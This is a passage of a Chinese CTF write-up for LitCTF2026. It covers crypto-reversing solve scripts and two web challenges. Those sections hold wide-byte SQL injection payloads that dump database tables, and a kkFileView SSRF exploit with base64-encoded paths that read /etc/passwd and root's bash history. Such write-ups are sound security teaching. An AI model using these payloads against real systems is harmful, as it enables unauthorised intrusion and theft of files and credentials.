+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">alphabet = <span class="string">&quot;2KuEphj84USZF67iloxzfYd+MrDgRG9yLwBnHAXcJq3eCN/s1bOQ5TvPa0tVkWmI&quot;</span></span><br><span class="line">target = <span class="string">&quot;zjA5lToj9PUAGn2O+v6TRPosgYWB6noyGjhBgjfwyl==&quot;</span></span><br><span class="line">table = &#123;c: i <span class="keyword">for</span> i, c in <span class="title function_">enumerate</span><span class="params">(alphabet)</span>&#125;</span><br><span class="line">out = bytearray()</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">0</span>, len(target)</span>, <span class="number">4</span>):</span><br><span class="line">    chunk = target[i:i+<span class="number">4</span>]</span><br><span class="line">    vals = []</span><br><span class="line">    pad = chunk.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> ch in chunk:</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            vals.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            vals.append(table[ch])</span><br><span class="line">    n = (</span><br><span class="line">        (vals[<span class="number">0</span>] &lt;&lt; <span class="number">18</span>) |</span><br><span class="line">        (vals[<span class="number">1</span>] &lt;&lt; <span class="number">12</span>) |</span><br><span class="line">        (vals[<span class="number">2</span>] &lt;&lt; <span class="number">6</span>)  |</span><br><span class="line">        vals[<span class="number">3</span>]</span><br><span class="line">    )</span><br><span class="line">    out.append((n &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">if</span> pad &lt; <span class="number">2</span>:</span><br><span class="line">        out.append((n &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">if</span> pad &lt; <span class="number">1</span>:</span><br><span class="line">        out.append(n &amp; <span class="number">0xff</span>)</span><br><span class="line">print(out.decode())</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="LitCTF2026-lit-rc4-variant"><a href="#LitCTF2026-lit-rc4-variant" class="headerlink" title="[LitCTF2026] lit_rc4_variant"></a>[LitCTF2026] lit_rc4_variant</h2><p>魔改RC4，s盒为64位，使用g_key（已知）初始化s盒，标准KSA， 魔改PRGA，这里多加了一次S[i]，g_cipher是密文，已知。脚本解密得到：LitCTF{rev05_rc4_variant_64!}</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">g_cipher = [</span><br><span class="line">    <span class="number">0x7B</span>, <span class="number">0x3D</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x4E</span>, <span class="number">0x72</span>, <span class="number">0x42</span>, <span class="number">0x7D</span>, <span class="number">0x45</span>, <span class="number">0x37</span>,</span><br><span class="line">    <span class="number">0x76</span>, <span class="number">0x0F</span>, <span class="number">0x53</span>, <span class="number">0x53</span>, <span class="number">0x4F</span>, <span class="number">0x66</span>, <span class="number">0x37</span>, <span class="number">0x17</span>, <span class="number">0x75</span>, <span class="number">0x37</span>,</span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0x49</span>, <span class="number">0x58</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x7F</span>, <span class="number">0x79</span>, <span class="number">0x1F</span>, <span class="number">0x3A</span></span><br><span class="line">]</span><br><span class="line">g_key = b<span class="string">&quot;lit_rc4_key!&quot;</span></span><br><span class="line">S = list(range(<span class="number">64</span>))</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">64</span>)</span>:</span><br><span class="line">    j = (j + S[i] + g_key[i % len(g_key)]) % <span class="number">64</span></span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">flag = bytearray()</span><br><span class="line"><span class="keyword">for</span> c in g_cipher:</span><br><span class="line">    i = (i + <span class="number">1</span>) % <span class="number">64</span></span><br><span class="line">    j = (j + S[i]) % <span class="number">64</span></span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line">    k = (S[(S[i] + S[j]) &amp; <span class="number">0x3F</span>] + S[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">    flag.append(c ^ k)</span><br><span class="line">print(flag.decode())</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="LitCTF2026-lit-tea-standard"><a href="#LitCTF2026-lit-tea-standard" class="headerlink" title="[LitCTF2026] lit_tea_standard"></a>[LitCTF2026] lit_tea_standard</h2><p> 读入输入的 flag，对长度进行PKCS#7填充 ，将数据对齐到8字节，然后进行魔改tea加密，模数被改，更新公式也被改了</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">round</span> <span class="operator">=</span> <span class="number">0</span>; round &lt; <span class="number">32</span>; round++) &#123;</span><br><span class="line">    i -= <span class="number">1640531527</span>;</span><br><span class="line">    v0 += ((i + v1) ^ ((v1 &gt;&gt; <span class="number">5</span>) - <span class="number">1341448704</span>) ^ ((v1 &lt;&lt; <span class="number">4</span>) - <span class="number">1591939156</span>));</span><br><span class="line">    v1 += ((i + v0) ^ ((v0 &gt;&gt; <span class="number">5</span>) - <span class="number">559038737</span>) ^ ((v0 &lt;&lt; <span class="number">4</span>) - <span class="number">889275714</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>最后与密文g_cipher比较。脚本解密得到：LitCTF{rev03_tea_standard!!}</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">struct</span></span><br><span class="line"><span class="variable">g_cipher</span> <span class="operator">=</span> bytes([</span><br><span class="line">    <span class="number">0xED</span>, <span class="number">0xEF</span>, <span class="number">0x21</span>, <span class="number">0xFE</span>, <span class="number">0xB7</span>, <span class="number">0x9B</span>, <span class="number">0x3C</span>, <span class="number">0xB0</span>, </span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x93</span>, <span class="number">0x72</span>, <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x3E</span>, <span class="number">0x29</span>, <span class="number">0xBC</span>, </span><br><span class="line">    <span class="number">0x36</span>, <span class="number">0xF7</span>, <span class="number">0x0C</span>, <span class="number">0x92</span>, <span class="number">0x2E</span>, <span class="number">0x5A</span>, <span class="number">0xAE</span>, <span class="number">0x46</span>, </span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0xFA</span>, <span class="number">0x45</span>, <span class="number">0x25</span>, <span class="number">0x1A</span>, <span class="number">0xE5</span>, <span class="number">0x8C</span>, <span class="number">0x87</span></span><br><span class="line">])</span><br><span class="line">MASK = <span class="number">0xFFFFFFFF</span></span><br><span class="line">def <span class="title function_">decrypt_block</span><span class="params">(v9, v10)</span>:</span><br><span class="line">    i = -<span class="number">957401312</span> &amp; <span class="type">MASK</span></span><br><span class="line">    <span class="variable">DELTA</span> <span class="operator">=</span> <span class="number">1640531527</span> &amp; MASK</span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        sum1 = ((i + v9) ^ ((v9 &gt;&gt; <span class="number">5</span>) - <span class="number">559038737</span>) ^ (<span class="number">16</span> * v9 - <span class="number">889275714</span>)) &amp; <span class="type">MASK</span></span><br><span class="line">        <span class="variable">v10</span> <span class="operator">=</span> (v10 - sum1) &amp; <span class="type">MASK</span></span><br><span class="line">        <span class="variable">sum2</span> <span class="operator">=</span> ((i + v10) ^ ((v10 &gt;&gt; <span class="number">5</span>) - <span class="number">1341448704</span>) ^ (<span class="number">16</span> * v10 - <span class="number">1591939156</span>)) &amp; <span class="type">MASK</span></span><br><span class="line">        <span class="variable">v9</span> <span class="operator">=</span> (v9 - sum2) &amp; <span class="type">MASK</span></span><br><span class="line">        <span class="variable">i</span> <span class="operator">=</span> (i + DELTA) &amp; MASK</span><br><span class="line">    <span class="keyword">return</span> v9, <span class="type">v10</span></span><br><span class="line"><span class="variable">plain_bytes</span> <span class="operator">=</span> bytearray()</span><br><span class="line"><span class="keyword">for</span> chunk_idx in <span class="title function_">range</span><span class="params">(<span class="number">0</span>, <span class="number">32</span>, <span class="number">8</span>)</span>:</span><br><span class="line">    block = g_cipher[chunk_idx:chunk_idx+<span class="number">8</span>]</span><br><span class="line">    v9, v10 = struct.unpack(<span class="string">&quot;&lt;II&quot;</span>, block)</span><br><span class="line">    v9_dec, v10_dec = decrypt_block(v9, v10)</span><br><span class="line">    plain_bytes.extend(struct.pack(<span class="string">&quot;&lt;II&quot;</span>, v9_dec, v10_dec))</span><br><span class="line">pad_len = plain_bytes[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span> &lt; pad_len &lt;= <span class="number">8</span>:</span><br><span class="line">    flag = plain_bytes[:-pad_len]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    flag = plain_bytes</span><br><span class="line"><span class="title function_">print</span><span class="params">(<span class="string">&quot;Flag:&quot;</span>, flag.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="LitCTF2026-lit-xtea-tweak"><a href="#LitCTF2026-lit-xtea-tweak" class="headerlink" title="[LitCTF2026] lit_xtea_tweak"></a>[LitCTF2026] lit_xtea_tweak</h2><p>输入 flag，做 8 字节分组 padding，要求 padding 后长度为 0x20，也就是 32 字节，每 8 字节作为两个uint32_t小端整数加密，加密结果和g_cipher作比较。加密算法是XTEA变种</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">    v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    sum += <span class="number">0xDEADBEEF</span>;</span><br><span class="line">    v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>把这个 XTEA 变种反过来解密g_cipher，去掉 padding，就得到 flag：LitCTF{rev04_xtea_delta_twk!}</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">struct</span></span><br><span class="line"><span class="variable">cipher</span> <span class="operator">=</span> bytes.fromhex(</span><br><span class="line">    <span class="string">&quot;e3ee1ee7d3a7966f&quot;</span></span><br><span class="line">    <span class="string">&quot;c6a7b9e1b94e6786&quot;</span></span><br><span class="line">    <span class="string">&quot;5f0304a6dbbbb940&quot;</span></span><br><span class="line">    <span class="string">&quot;563af79eee64d406&quot;</span></span><br><span class="line">)</span><br><span class="line">key = [</span><br><span class="line">    <span class="number">0x11111111</span>,</span><br><span class="line">    <span class="number">0x22222222</span>,</span><br><span class="line">    <span class="number">0x33333333</span>,</span><br><span class="line">    <span class="number">0x44444444</span>,</span><br><span class="line">]</span><br><span class="line">delta = <span class="number">0xDEADBEEF</span></span><br><span class="line">rounds = <span class="number">32</span></span><br><span class="line">mask = <span class="number">0xffffffff</span></span><br><span class="line">def <span class="title function_">decrypt_block</span><span class="params">(block)</span>:</span><br><span class="line">    v0, v1 = struct.unpack(<span class="string">&quot;&lt;2I&quot;</span>, block)</span><br><span class="line">    s = (delta * rounds) &amp; mask</span><br><span class="line">    <span class="keyword">for</span> _ in <span class="title function_">range</span><span class="params">(rounds)</span>:</span><br><span class="line">        v1 = (</span><br><span class="line">            v1</span><br><span class="line">            - (</span><br><span class="line">                ((((v0 &lt;&lt; <span class="number">4</span>) &amp; mask) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0)</span><br><span class="line">                ^ ((s + key[(s &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) &amp; mask)</span><br><span class="line">            )</span><br><span class="line">        ) &amp; <span class="type">mask</span></span><br><span class="line">        <span class="variable">s</span> <span class="operator">=</span> (s - delta) &amp; <span class="type">mask</span></span><br><span class="line">        <span class="variable">v0</span> <span class="operator">=</span> (</span><br><span class="line">            v0</span><br><span class="line">            - (</span><br><span class="line">                ((((v1 &lt;&lt; <span class="number">4</span>) &amp; mask) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1)</span><br><span class="line">                ^ ((s + key[s &amp; <span class="number">3</span>]) &amp; mask)</span><br><span class="line">            )</span><br><span class="line">        ) &amp; mask</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;2I&quot;</span>, v0, v1)</span><br><span class="line">plain = b<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">0</span>, len(cipher)</span>, <span class="number">8</span>):</span><br><span class="line">    plain += decrypt_block(cipher[i:i + <span class="number">8</span>])</span><br><span class="line">pad = plain[-<span class="number">1</span>]</span><br><span class="line">plain = plain[:-pad]</span><br><span class="line">print(plain.decode())</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="LitCTF2026-lit-ezsql"><a href="#LitCTF2026-lit-ezsql" class="headerlink" title="[LitCTF2026] lit_ezsql"></a>[LitCTF2026] lit_ezsql</h2><p>普通 SQL 注入如：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;10unionselect1,2,3,4,5</span><br></pre></td></tr></table></figure></div>
+
+<p>没有直接成功。后来发现加 debug&#x3D;1 会回显后端执行 SQL：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251313846.png"
+                      alt="img"
+                ></p>
+<p>再测试单引号：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/query?id=1&#x27;&amp;debug=1</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到单引号被转义：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251313367.png"
+                      alt="img"
+                ></p>
+<p>说明普通闭合被拦了。但数据库是 MariaDB&#x2F;MySQL，并且存在宽字节注入绕过。用：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%bf%27</span><br></pre></td></tr></table></figure></div>
+
+<p>其中 %27 是 ‘，后端转义后变成：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%bf%5c%27</span><br></pre></td></tr></table></figure></div>
+
+<p>在数据库字符集处理下，%bf%5c 会被当作一个宽字节字符，导致后面的 ‘ 成功逃逸，完成闭合。</p>
+<p><strong>验证注入</strong></p>
+<p>Payload：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/query?id=%bf%27%20or%201=1%23&amp;debug=1</span><br></pre></td></tr></table></figure></div>
+
+<p>等价 SQL：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE id=&#x27;¿\&#x27;or1=1#&#x27; LIMIT 50</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251313594.png"
+                      alt="img"
+                ></p>
+<p>实际数据库解析后，or 1&#x3D;1# 生效，返回 alice 和 bob 两条数据。</p>
+<p><strong>UNION 探测列数</strong></p>
+<p>页面表头有 5 列：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id name col2 col3 col4</span><br></pre></td></tr></table></figure></div>
+
+<p>测试：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/query?id=%bf%27%20union%20select%201,2,3,4,5%23&amp;debug=1</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2026/png/62866517/1779511823811-14e3d7c2-4628-4d1b-83c9-5834cfb9161c.png"
+                      alt="img"
+                ></p>
+<p>说明列数为 5。</p>
+<p><strong>枚举数据库信息</strong></p>
+<p>Payload：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/query?id=%bf%27%20union%20select%201,database(),user(),version(),5%23&amp;debug=1</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251314823.png"
+                      alt="img"
+                ></p>
+<p>database(): ezsql</p>
+<p>user(): ezsql@localhost</p>
+<p>version(): 10.5.29-MariaDB-0+deb11u1</p>
+<p><strong>枚举表名</strong></p>
+<p>Payload：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/query?id=%bf%27%20union%20select%201,table_name,table_schema,4,5%20from%20information_schema.tables%20where%20table_schema=database()%23&amp;debug=1</span><br></pre></td></tr></table></figure></div>
+
+<p>得到：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usersflag_store</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251314792.png"
+                      alt="img"
+                ></p>
+<p><strong>举字段名</strong></p>
+<p>Payload：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/query?id=%bf%27%20union%20select%201,column_name,table_name,4,5%20from%20information_schema.columns%20where%20table_schema=database()%23&amp;debug=1</span><br></pre></td></tr></table></figure></div>
+
+<p>得到：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251314839.png"
+                      alt="img"
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users: id, name, col2, col3, col4flag_store: id, flag</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>读取 flag</strong></p>
+<p>Payload：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/query?id=%bf%27%20union%20select%20id,flag,3,4,5%20from%20flag_store%23&amp;debug=1</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251314944.png"
+                      alt="img"
+                ></p>
+<p>flag：flag{rmdechs5-b6et-4qw-82na-xshmg76ekrmnp}</p>
+<h2 id="LitCTF2026-Northbridge-Document-Hub"><a href="#LitCTF2026-Northbridge-Document-Hub" class="headerlink" title="[LitCTF2026] Northbridge Document Hub"></a>[LitCTF2026] Northbridge Document Hub</h2><p>查看源代码 访问静态的js文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251314013.png"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251314630.png"
+                      alt="img"
+                ></p>
+<p>注释中给出了账密明文 ：<code>researcher:Research#2026</code></p>
+<p>给了一个接口路径:<code>/kkfileview/getCorsFile</code></p>
+<p> path: “&#x2F;kkfileview&#x2F;getCorsFile” - 接口路径</p>
+<p> queryKey: “urlPath” - 参数名</p>
+<p> node: “legacy-parse-02” - 使用 kkFileView</p>
+<p>通过搜索 kkFileView getCorsFile SSRF vulnerability ，找到了 GitHub Issues：</p>
+<p>kkFileView SSRF Vulnerability #392 (2022年)</p>
+<p> kkFileview v4.1.0存在SSRF漏洞，攻击者可以利用此漏洞造成服务器端请求伪造（SSRF）</p>
+<p>漏洞代码:</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/getCorsFile&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getCorsFile</span><span class="params">(String urlPath, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        urlPath = WebUtils.decodeBase64String(urlPath);  <span class="comment">// Base64解码</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        logger.error(String.format(BASE64_DECODE_ERROR_MSG, urlPath), ex);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ❌ 没有任何过滤！</span></span><br><span class="line">    <span class="keyword">if</span> (urlPath.toLowerCase().startsWith(<span class="string">&quot;file:&quot;</span>) || </span><br><span class="line">        urlPath.toLowerCase().startsWith(<span class="string">&quot;file%3&quot;</span>)) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;异常，可能存在非法访问，urlPath：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 直接使用用户提供的 urlPath 发起请求</span></span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> WebUtils.normalizedURL(urlPath);</span><br><span class="line">    <span class="type">byte</span>[] bytes = NetUtil.downloadBytes(url.toString());</span><br><span class="line">    IOUtils.write(bytes, response.getOutputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Base64编码绕过 成功获取</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /kkfileview/getCorsFile?urlPath=ZmlsZTovLy9ldGMvcGFzc3dk</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251315722.png"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251315203.png"
+                      alt="img"
+                ></p>
+<p>读取历史命令 &#x2F;root&#x2F;.bash_history</p>
+<p>payload</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kkfileview/getCorsFile?urlPath=L3Jvb3QvLmJhc2hfaGlzdG9yeQ==</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251315491.png"
+                      alt="img"
+                ></p>
+<p>存在 &#x2F;opt&#x2F;kkfileview&#x2F;cache&#x2F;parsed&#x2F;q1_finance_report_2026.zip</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251315335.png"
+                      alt="img"
+                ></p>
+<p>payload</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kkfileview/getCorsFile?urlPath=ZmlsZTovLy9vcHQva2tmaWxldmlldy9jYWNoZS9wYXJzZWQvcTFfZmluYW5jZV9yZXBvcnRfMjAyNi56aXA=</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251315018.png"
+                      alt="img"
+                ></p>
+<p>解压得到打开文本文档flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251315146.png"
+                      alt="img"
+                ></p>
+<h2 id="LitCTF2026-华辰企业服务运营平台"><a href="#LitCTF2026-华辰企业服务运营平台" class="headerlink" title="[LitCTF2026] 华辰企业服务运营平台"></a>[LitCTF2026] 华辰企业服务运营平台</h2><p>查看 &#x2F;login 页面发现默认用户名 user ，密码由系统管理员下发</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
